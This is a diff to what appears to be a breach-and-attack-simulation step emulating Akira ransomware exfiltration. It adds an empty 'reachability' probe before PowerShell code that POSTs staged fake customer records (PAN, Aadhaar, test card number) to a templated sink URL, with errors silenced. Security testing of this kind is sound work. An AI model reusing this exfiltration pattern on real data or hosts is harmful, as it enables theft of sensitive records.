@@ -259,6 +259,11 @@ steps:
     command: |
       $ErrorActionPreference = 'SilentlyContinue'
       $staged = "[BAS-SIM-AKIRA-S5B] CustomerID,PAN,Aadhaar,CreditCard`nBAS-SIM-SINK,ABCDE1234F,123456789012,4111111111111111"
+      # Reachability probe: empty payload on its own channel. It carries no sensitive
+      # content, so DLP has nothing to match. The sink records it only if this path reaches it.
+      try {
+        Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=''; channel='reachability'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
+      } catch { }
       try {
         Invoke-RestMethod -Uri '{{SINK_URL}}' -Method Post -Body (@{token='{{SINK_TOKEN}}'; payload=$staged; channel='https-post'} | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10 | Out-Null
         Write-Output "EXEC T1567: pre-encryption staging record POSTed over HTTPS. [BAS-SIM-AKIRA-S5B]"
